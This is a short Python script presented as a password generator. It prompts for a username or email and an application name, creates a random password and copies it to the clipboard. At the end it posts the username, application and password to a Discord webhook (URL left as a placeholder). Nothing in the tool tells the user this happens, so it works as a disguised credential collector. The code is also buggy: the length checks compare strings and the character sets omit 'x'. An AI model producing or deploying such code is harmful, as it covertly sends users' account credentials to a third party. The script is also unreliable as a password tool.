from dataclasses import asdict
from multiprocessing.sharedctypes import Value
from discord_webhook import DiscordWebhook, DiscordEmbed
#-----------------------------------------------------------------------------------------------------------------------
webhook = DiscordWebhook(url="webhook-url-here", username="Password Generator", avatar_url="https://avatars.githubusercontent.com/u/97315905?s=400&u=0c2eb33523f1bdeae467f4e24ec9152c974779b8&v=4")
#-----------------------------------------------------------------------------------------------------------------------

User = input("Write your username or mail: ")
Application = input("Write your application name: ")
#-----------------------------------------------------------------------------------------------------------------------

import random

LowPass = random.randint(1, 50)
choosepass = input("Password length [1,50]: ")
#-----------------------------------------------------------------------------------------------------------------------
if choosepass > '50':
    print("The password is too long")
    print("Place a valid from 1 to 50")
    print("Try again")
    
#-----------------------------------------------------------------------------------------------------------------------
if choosepass < '1':
    print("The password is too short")
    print("Place a valid from 1 to 50")
    print("Try again")

#-----------------------------------------------------------------------------------------------------------------------    
lower = "abcdefghijklmnopqrstuvwyz"
upper = "ABCDEFGHIJKLMNOPQRSTUVWYZ"
NUMBER = "0123456789"
Symbol = "@#€*.$^!%&"
all=lower + upper + NUMBER +Symbol
length = int(choosepass)
password = "".join(random.sample(all,length))
print(" ThePassword You Generated is :",password)
import pyperclip
pyperclip.copy('The text to be copied to the clipboard.')
spam = pyperclip.copy(password)
print("You have the password on your clipboard")

#-----------------------------------------------------------------------------------------------------------------------


embed = DiscordEmbed(
    title="Password Generator", description="By:Acceded", color='800000'
)
embed.set_author(
    name="Acceded",
    url="https://github.com/Acceded",
    icon_url="https://avatars.githubusercontent.com/u/97315905?s=400&u=0c2eb33523f1bdeae467f4e24ec9152c974779b8&v=4",
)
embed.set_footer(text="Password Generator")
embed.set_timestamp()
embed.add_embed_field(name="User or mail", value=User, inline=False)
embed.add_embed_field(name="Name of the application", value=Application, inline=False)
embed.add_embed_field(name="Your password is", value=("||" +password+ "||") , inline=False)


webhook.add_embed(embed)
response = webhook.execute()

from discord_webhook import DiscordWebhook

